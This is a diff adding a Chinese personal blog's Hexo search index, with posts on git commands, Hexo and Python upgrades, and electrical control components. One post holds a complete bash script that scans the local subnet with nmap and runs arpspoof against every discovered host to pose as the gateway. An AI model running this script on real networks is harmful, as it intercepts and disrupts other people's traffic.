@@ -1,0 +1,152 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>git使用笔记</title>
+      <link href="/2021/08/16/git-shi-yong-bi-ji/"/>
+      <url>/2021/08/16/git-shi-yong-bi-ji/</url>
+      
+        <content type="html"><![CDATA[<h1 id="git使用笔记"><a href="#git使用笔记" class="headerlink" title="git使用笔记"></a>git使用笔记</h1><p>本文是对[《learn-github-from-zero》](链接：<a href="https://pan.baidu.com/s/1Gk1kw90_GG2jZGrwGuxY7Q">https://pan.baidu.com/s/1Gk1kw90_GG2jZGrwGuxY7Q</a><br>提取码：n4n1)笔记</p><h2 id="什么是git？"><a href="#什么是git？" class="headerlink" title="什么是git？"></a>什么是git？</h2><p>Git是新时代的版本控制系统</p><h2 id="Git使用"><a href="#Git使用" class="headerlink" title="Git使用"></a>Git使用</h2><h3 id="1-linux下建立文件"><a href="#1-linux下建立文件" class="headerlink" title="1.linux下建立文件"></a>1.linux下建立文件</h3><pre class="line-numbers language-linux" data-language="linux"><code class="language-linux">mkdir test（创建文件夹test）cd test（切换到test目录）touch a.md（新建a.md文件）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注意：在进行任何Git操作之前，都要先切换到Git仓库目录，也就是先要先切换到项目的文件夹目录下。使用<strong>git status</strong>查看状态</p><h3 id="2-git基本命令"><a href="#2-git基本命令" class="headerlink" title="2.git基本命令"></a>2.git基本命令</h3><ol><li>git init    始化git仓库</li><li>git status  查看状态</li><li>git add  将文件加入git仓库</li><li>git commit  提交文件      git commit  -m ‘first    commit’    <em>commit    是提交的意思，- m代表是提交信息，执行了以上命令代表我们已经正式进行了第一次提交</em></li><li>git log  可以查看所有产生的commit记录</li><li>git  branch  <em>branch    即分支的意思，执行git init初始化git仓库之后会默认生成一个主分支master，也是你所在的默认分支，也基 本是实际开发正式环境下的分支，一般情况下    master    分支不会轻易直接在上面操作的，你们 可以输入git    branch查看下当前分支情况，git branch a 就新建了一个名字叫a的分支</em></li><li>git branch -d 删除分支 。git branch -D强制删除分支代码</li><li>git checkout 切换分支 ，git checkout -b a建立分支a并切换到a分支</li><li>git merge 合并分支代码</li><li>git tag  新建一个标签</li><li>Push &amp; Pull   git push origin master：本地代码推到远程master分支 git pull origin master ：新的代码更新到本地</li><li>git remote -v 查看远程仓库 <em>git remote add origin    <a href="mailto:git@github.com">git@github.com</a>:XXXX：就是添加一个远程仓库origin    是给这个项目的远程仓库起的名字</em></li><li>git push origin master 提交代码到指定分支</li><li>git rm –cached 这个命令去移除这个缓存。</li></ol><h3 id="3-git进阶命令"><a href="#3-git进阶命令" class="headerlink" title="3.git进阶命令"></a>3.git进阶命令</h3><h4 id="3-1用户名和邮箱"><a href="#3-1用户名和邮箱" class="headerlink" title="3.1用户名和邮箱"></a>3.1用户名和邮箱</h4><p>设置自己的用户名与邮箱</p><pre class="line-numbers language-git" data-language="git"><code class="language-git">gitconfig--global  user.name<span class="token string">"stormzhang"</span>gitconfig--global  user.email <span class="token string">"stormzhang.dev@gmail.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>注意：GitHub上的邮箱可以到Setting-&gt;Emails里查看</strong></p><h4 id="3-2别名（alisa）"><a href="#3-2别名（alisa）" class="headerlink" title="3.2别名（alisa）"></a>3.2别名（alisa）</h4><pre class="line-numbers language-git" data-language="git"><code class="language-git">gitconfig--globalalias.cocheckout#别名gitconfig--globalalias.cicommitgitconfig--globalalias.ststatusgitconfig--globalalias.brbranch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>日志处理命令设置</p><pre class="line-numbers language-linux" data-language="linux"><code class="language-linux">gitlog--graph--pretty=format:'%Cred%h%Creset% -C(yellow)%d%Creset%s%Cgreen(%cr)%C(boldblue)&lt;%an&gt;%Creset' --abbrev- commit --date=relative<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-git" data-language="git"><code class="language-git">gitconfig --globalalias.lg <span class="token string">"log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)% d%Creset %s%Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit--date=relative"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-3diff"><a href="#3-3diff" class="headerlink" title="3.3diff"></a>3.3diff</h4><p>红色的部分前面有个-代表我删除的，绿色的部分前面有个+代表我增加的。git diff只能比较当前文件和暂存区文件差异，什么是暂存区？就是你还没有执行git add的文件</p><pre class="line-numbers language-git" data-language="git"><code class="language-git">gitdiff&lt;$id1&gt;&lt;$id2&gt;#比较两次提交之间的差异gitdiff&lt;branch1&gt;..&lt;branch2&gt;#在两个分支之间比较gitdiff--staged#比较暂存区和版本库差异<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3-4checkout"><a href="#3-4checkout" class="headerlink" title="3.4checkout"></a>3.4checkout</h4><p>checkout不只用作切换分支，他可以用来切换tag，切换到某次commit</p><pre class="line-numbers language-git" data-language="git"><code class="language-git">gitcheckoutv1.0gitcheckoutffd9f2dd68f1eb21d36cee50dbdd504e95d9c8f7#后面的一长串是commit_id，是每次com mit的SHA1值，可以根据git log看到。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>checkout还有一个撤销的作用</strong>，git checkout a.md <em>checkout命令只能撤销还没有add进暂存区的文件</em></p><h4 id="3-5stash"><a href="#3-5stash" class="headerlink" title="3.5stash"></a>3.5stash</h4><p>git stash是把当前分支所有没有    commit    的代码先暂存起来</p><p>git stash list查看暂存区记录</p><p>git stash apply还原代码</p><p>git stash drop    删除stash记录</p><p>git stash pop <em>pop跟apply的唯一区别就是pop不但会帮你把代码还原，还自动帮你 把这条stash记录删除，省的自己再drop一次了</em></p><p>git stash clear 清空所有暂存区的记录</p><h4 id="3-6merge-amp-rebase"><a href="#3-6merge-amp-rebase" class="headerlink" title="3.6merge&amp;rebase"></a>3.6merge&amp;rebase</h4><p>merge分支是合并的意思，我们在一个featureA分支开发完了一个功能，这个时候 需要合并到主分支master上去,我们只需要进行如下操作</p><pre class="line-numbers language-git" data-language="git"><code class="language-git">gitcheckout master gitmerge featureA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>rebase 命令也是合并的意思</p><pre class="line-numbers language-git" data-language="git"><code class="language-git">gitcheckout master gitrebasefeatureA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>rebase跟merge的区别你们可以理解成有两个书架，你需要把两个书架的书整理到一起 去，第一种做法是merge，比较粗鲁暴力，就直接腾出一块地方把另一个书架的书全部放进去,虽然暴力，但是这种做法你可以知道哪些书是来自另一个书架的；第二种做法就是 rebase，他会把两个书架的书先进行比较，按照购书的时间来给他重新排序，然后重新放置好，这样做的好处就是合并之后的书架看起来很有逻辑，但是你很难清晰的知道哪些书来自 哪个书架的。</p><h2 id="其他常用git命令"><a href="#其他常用git命令" class="headerlink" title="其他常用git命令"></a>其他常用git命令</h2><h4 id="git-查看最近或某一次提交修改的文件列表相关命令整理"><a href="#git-查看最近或某一次提交修改的文件列表相关命令整理" class="headerlink" title="git 查看最近或某一次提交修改的文件列表相关命令整理"></a>git 查看最近或某一次提交修改的文件列表相关命令整理</h4><pre class="line-numbers language-git" data-language="git"><code class="language-git">git log --name-status 每次修改的文件列表, 显示状态git log --name-only 每次修改的文件列表git log --stat 每次修改的文件列表, 及文件修改的统计git whatchanged 每次修改的文件列表git whatchanged --stat 每次修改的文件列表, 及文件修改的统计git show 显示最后一次的文件改变的具体内容git show -5 显示最后 5 次的文件改变的具体内容git show commitid 显示某个 commitid 改变的具体内容git show --stat commitid 显示某个 commitid 文件列表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Git删除本地任意提交记录"><a href="#Git删除本地任意提交记录" class="headerlink" title="Git删除本地任意提交记录"></a>Git删除本地任意提交记录</h4><pre class="line-numbers language-git" data-language="git"><code class="language-git"><span class="token comment"># 删除本地最后一条记录，如果需要删除最后提交的N条记录，将“1”替换为一个具体的数字“N”即可。</span>git reset --hard HEAD~1git rebase -i 删除提交的某条记录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> git </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hexo升级之路</title>
+      <link href="/2021/08/16/hexo-sheng-ji-zhi-lu/"/>
+      <url>/2021/08/16/hexo-sheng-ji-zhi-lu/</url>
+      
+        <content type="html"><![CDATA[<p>更新blog废了一些时间，主要是更新hexo版本</p><h1 id="1-淘宝镜像的设置"><a href="#1-淘宝镜像的设置" class="headerlink" title="1.淘宝镜像的设置"></a>1.淘宝镜像的设置</h1><pre class="line-numbers language-linux" data-language="linux"><code class="language-linux">npm config set registry https://registry.npm.taobao.orgnpm config set disturl https://npm.taobao.org/dist<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="2-升级hexo"><a href="#2-升级hexo" class="headerlink" title="2.升级hexo"></a>2.升级hexo</h1><p>先<code>hexo version</code>查看当前版本</p><p>更新hexo：npm i hexo-cli -g</p><p>使用<code>npm install -g npm-check</code>和<code>npm-check</code>，检查系统中的插件是否有升级的，可以看到自己前面都安装了那些插件</p><p>使用<code>npm install -g npm-upgrade</code>和<code>npm-upgrade</code>，升级系统中的插件</p><p>使用<code>npm update -g</code>和<code>npm update --save</code></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Hexo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Linux操作系统启动原理和故障分析</title>
+      <link href="/2021/01/12/linux-cao-zuo-xi-tong-qi-dong-yuan-li-he-gu-zhang-fen-xi/"/>
+      <url>/2021/01/12/linux-cao-zuo-xi-tong-qi-dong-yuan-li-he-gu-zhang-fen-xi/</url>
+      
+        <content type="html"><![CDATA[<p>详细描述Linux系统启动原理，各种常见的故障和修复方法，以及对比一些核心组件在各版本Linux系统上的功能差异。<br><img src="https://static.wenshushu.cn/uf/63ux6yctkmd/img?st=MWF4bTk4cDFrODguWVpibE4=&amp;op=zmmw-1200" alt="笔记"></p><hr><p><a href="https://www.bilibili.com/video/BV16a411F74Z">b站視頻地址</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>arpspoof使用shell脚本</title>
+      <link href="/2020/06/16/arpspoof-shi-yong-shell-jiao-ben/"/>
+      <url>/2020/06/16/arpspoof-shi-yong-shell-jiao-ben/</url>
+      
+        <content type="html"><![CDATA[<h1 id="使用shell脚本"><a href="#使用shell脚本" class="headerlink" title="使用shell脚本"></a>使用shell脚本</h1><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#!/bin/bash#auto make arp 攻击#by bingyangcd /home/ &amp;&amp; mkdir arp &amp;&amp; cd arp/ip=`ifconfig | grep 'inet 19' | sed 's/^ .*inet //g'| sed 's/ net.*$//g'` #获得本机ipsour=`ifconfig | grep 'inet 19' | sed 's/^ .*inet //g'| sed 's/ net.*$//g'| cut -d'.' -f 3` #获得本机网关关键值IPaddress=192.168.$sour.0/24gateway=192.168.$sour.1echo -e "\033[32m仅供安全测试及安全学习,禁止非法使用!\033[0m"echo -e "\033[32m仅供安全测试及安全学习,禁止非法使用!\033[0m"echo -e "\033[32m仅供安全测试及安全学习,禁止非法使用!\033[0m"echo -e "\033[32--------------------开始安装框架--------------------------------\033[0m"echo -e "\033[32marp自动攻击脚本\033[0m"echo -e "\033[32----------------解锁目标------------------------------------\033[0m"touch /home/arp/listip.txtwenben=/home/arp/listip.txtecho $IPaddressecho $ipecho $sour#&gt;$wenbenipp=$(nmap -sP $IPaddress | grep 'Nmap s' | cut -d ' ' -f 5 | sed '1d'| grep -v $ip)waitecho "$ipp" | tee -a $wenben#进行arp群体攻击，目标来自于文件，如果想让自己上网，就把自己的IP从文件中去掉while read listdo    {arpspoof -i ens33 -t $list $gateway}done &lt; /home/arp/listip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> shell linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Linux centos7 升级安装Python2到3</title>
+      <link href="/2020/03/16/centos7-zhong-python2-sheng-ji-python3/"/>
+      <url>/2020/03/16/centos7-zhong-python2-sheng-ji-python3/</url>
+      
+        <content type="html"><![CDATA[<p>运行python -V记住此时旧版本号</p><h1 id="1、安装必备软件"><a href="#1、安装必备软件" class="headerlink" title="1、安装必备软件"></a>1、安装必备软件</h1><hr><p><code>yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel gcc</code></p><h1 id="2、切换工作目录至-usr-local"><a href="#2、切换工作目录至-usr-local" class="headerlink" title="2、切换工作目录至/usr/local"></a>2、切换工作目录至/usr/local</h1><hr><p><code>cd /usr/local</code></p><h1 id="3、下载目标python版本压缩包"><a href="#3、下载目标python版本压缩包" class="headerlink" title="3、下载目标python版本压缩包"></a>3、下载目标python版本压缩包</h1><hr><p><code>wget http://npm.taobao.org/mirrors/python/3.8.0/Python-3.8.0.tgz</code></p><h1 id="4、解压压缩包"><a href="#4、解压压缩包" class="headerlink" title="4、解压压缩包"></a>4、解压压缩包</h1><hr><p><code>tar -xzf Python-3.8.0.tgz</code></p><h1 id="5、在当前目录下创建文件夹–python3"><a href="#5、在当前目录下创建文件夹–python3" class="headerlink" title="5、在当前目录下创建文件夹–python3"></a>5、在当前目录下创建文件夹–python3</h1><hr><p><code>mkdir python3</code></p><h1 id="6、编译与安装"><a href="#6、编译与安装" class="headerlink" title="6、编译与安装"></a>6、编译与安装</h1><hr><p>1.进入解压文件路径<br><code>cd Python-3.8.0</code><br>2.生成makefile文件<br> <code>./configure --prefix=/usr/local/python3</code><br>3.编译安装<br><code>make&amp;&amp;make install</code></p><h1 id="7、创建新版本的软链接"><a href="#7、创建新版本的软链接" class="headerlink" title="7、创建新版本的软链接"></a>7、创建新版本的软链接</h1><hr><p>执行这一步的作用是让我们安装的python3可以通过直接输入python来使用。<br>1.修改旧版本<br><code>mv /usr/bin/python /usr/bin/python_bak</code><br>2.创建新的软连接</p><p><code>ln -s /usr/local/python3/bin/python3 /usr/bin/python</code></p><h1 id="8、配置pip"><a href="#8、配置pip" class="headerlink" title="8、配置pip"></a>8、配置pip</h1><hr><p>将/usr/local/python3/bin加入PATH<br>更改~/.bash_profile<br><code>vim ~/.bash_profile</code><br>将其中的ATH=SPATH: SHOME/bin改为PATH=$PATH: SHOME /bin: /usr/local/python3/bin在执行source ~/.bash_profile</p><h1 id="9、问题"><a href="#9、问题" class="headerlink" title="9、问题"></a>9、问题</h1><hr><p>这时候yum是不能用的<br>1.这个时候我们只需要修改/usr/bin/yum文件，将其中#!/usr/bin/python改为#!/usr/bin/python2.7（ 因为我的旧版本是2.7）<br>2.还有就是修改/usr/libexec/urlgrabber-ext-down文件，将python同样指向旧版本，就可以了,即：将#!/usr/bin/python改为#!/usr/bin/python2.7！</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> centos7 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>电气控制技术基础及应用基础</title>
+      <link href="/2020/03/09/dian-qi-kong-zhi-ji-zhu-ji-chu-ji-ying-yong-ji-chu/"/>
+      <url>/2020/03/09/dian-qi-kong-zhi-ji-zhu-ji-chu-ji-ying-yong-ji-chu/</url>
+      
+        <content type="html"><![CDATA[<hr><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>低压电器(简称电器)是用于交流50Hz (或60Hz)额定电压为1200V以下、直流额定电压为1500V以下的电路内起通断、保护、控制或调节作用的电器，如接触器、继电器等。电器可分为配电电器和控制电器两大类，它们是组成成套电气设备的基础配套元件，在电力输配电系统中得到广泛的应用。</p><h2 id="接触器"><a href="#接触器" class="headerlink" title="接触器"></a>接触器</h2><p>接触器是一种自动控制开关设备，主要用于频繁接通或分断交、直流电路及大容量控制电路。根据线圈所加电压的不同，接触器可分为交流接触器与直流接触器两种。<br>接触器主要由电磁系统、触头系统灭弧装置及其他部分组成<br>接触器的额定电压是指主触头的额定电压，应等于负载的额定电压。通常电压等级分为交流接触器380、660V 及1140V;直流接触器220、440、 660V。<br>接触器的额定电流是指主触头的额定电流，通常电流等级分为交流接触器5.10、20、40、60、100、150、 250、 400A和600A,直流接触器为25、40、 60、100、150、 250、400A和600A</p><h2 id="继电器"><a href="#继电器" class="headerlink" title="继电器"></a>继电器</h2><p>继电器是根据一定的信号(如电流、电压、时间和速度等物理量)的变化来接通或分断小电流电路和电器的自动控制电器，主要用于控制与保护电路中，根据它自身的触头通断，达到预定的控制目的或提供一定的保护。<br>电磁式继电器在结构.上是由电磁机构、触头和释放弹簧等组成的<br>若继电器的输出状态发生改变是由发热(温度)所引起的，这种电器称为热继电<br>器。它主要安装在主回路中，用于交流电动机的过载、断相及其他电器设备发热状态<br>的保护。</p><h2 id="速度继电器"><a href="#速度继电器" class="headerlink" title="速度继电器"></a>速度继电器</h2><p>速度继电器是利用速度下降到零附近时，使输出触头发生通和断的一-种控制电器，它主要用于笼型异步电动机的反接制动控制，也称反接制动继电器</p><h2 id="熔断器"><a href="#熔断器" class="headerlink" title="熔断器"></a>熔断器</h2><p>熔断器是一种当流过它的电流超过规定值后，靠它本身产生的热量使熔体熔化而电路的电器。<br>熔断器的熔体串联在被保护的电路中，当电路正常工作时，熔体允许通过一-定大小的<br>电流而不熔断。当电路发生短路或严重过载时，熔体中流过很大的故障电流，该电流产生<br>的热量使熔体温度迅速升高达到熔点，使熔体熔断并切断电路，从而达到保护的目的。熔<br>断器广泛应用于低压配电系统和控制系统及用电设备中作短路和过电流保护用，是目前应<br>用最普遍的保护器件之一。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电气控制技术基础 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>微信图片压缩脚本简介</title>
+      <link href="/2020/02/12/wei-xin-tu-pian-ya-suo-jiao-ben-jian-jie/"/>
+      <url>/2020/02/12/wei-xin-tu-pian-ya-suo-jiao-ben-jian-jie/</url>
+      
+        <content type="html"><![CDATA[<h1 id="为什么写这个脚本"><a href="#为什么写这个脚本" class="headerlink" title="为什么写这个脚本"></a>为什么写这个脚本</h1><p>因为在微信编辑平台，微信文章中图片被限制在2M，而我们的图片往往超过这一数值，于是就诞生用python写一个批量图片压缩脚本的想法</p><hr><h1 id="为什么是python"><a href="#为什么是python" class="headerlink" title="为什么是python"></a>为什么是python</h1><p>python语法简单以及众多的第三方库（主要是库多），适合新手使用。</p><hr><h1 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h1><p>用tkinter库提供图形化界面，用强大的pil库处理图片。这两个第三方库需要下载，其他的库则使用python的标准库。</p><p><img src="https://static.wenshushu.cn/uf/63v2qzb7un4/img?st=MWF4bTk4cDFrODguWVpibE4=&amp;op=zmmw-1200" alt="界面图片"></p><p>代码我已上传<a href="https://github.com/iseland/Picture-compression-script">GitHub</a>.</p><h2 id="读取文件夹中图片代码"><a href="#读取文件夹中图片代码" class="headerlink" title="读取文件夹中图片代码"></a>读取文件夹中图片代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">source_dir <span class="token operator">=</span> filedialog<span class="token punctuation">.</span>askdirectory<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">u"选择压缩文件夹路径:"</span><span class="token punctuation">)</span>target_dir <span class="token operator">=</span> filedialog<span class="token punctuation">.</span>askdirectory<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">u"选择文件保存文件夹"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="图片压缩函数"><a href="#图片压缩函数" class="headerlink" title="图片压缩函数"></a>图片压缩函数</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">resize_images_1</span><span class="token punctuation">(</span>source_dir <span class="token punctuation">,</span>target_dir<span class="token punctuation">,</span>threshold<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#遍历指定路径文件</span>filenames <span class="token operator">=</span> glob<span class="token punctuation">(</span><span class="token string">'{}/*'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>source_dir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> filename <span class="token keyword">in</span> filenames<span class="token punctuation">:</span>        <span class="token comment">#得到图片文件大小</span>filesize <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getsize<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token keyword">if</span> filesize<span class="token operator">&gt;=</span>threshold<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token keyword">with</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span> <span class="token keyword">as</span> im<span class="token punctuation">:</span>width <span class="token punctuation">,</span> height <span class="token operator">=</span> im<span class="token punctuation">.</span>sizenew_width <span class="token operator">=</span>width<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>new_width <span class="token operator">=</span>new_width<span class="token operator">-</span><span class="token number">5</span>new_height <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>new_width <span class="token operator">*</span> height <span class="token operator">*</span> <span class="token number">1.0</span> <span class="token operator">/</span> width<span class="token punctuation">)</span><span class="token keyword">if</span>  new_width<span class="token operator">*</span>new_height<span class="token operator">&lt;=</span>threshold<span class="token punctuation">:</span><span class="token keyword">break</span>resized_im <span class="token operator">=</span> im<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span>new_width<span class="token punctuation">,</span>new_height<span class="token punctuation">)</span><span class="token punctuation">)</span>output_filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>source_dir<span class="token punctuation">,</span> target_dir<span class="token punctuation">)</span>                <span class="token comment">#将压缩后图片另存为新的文件夹中</span>resized_im<span class="token punctuation">.</span>save<span class="token punctuation">(</span>output_filename<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python 腳本 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
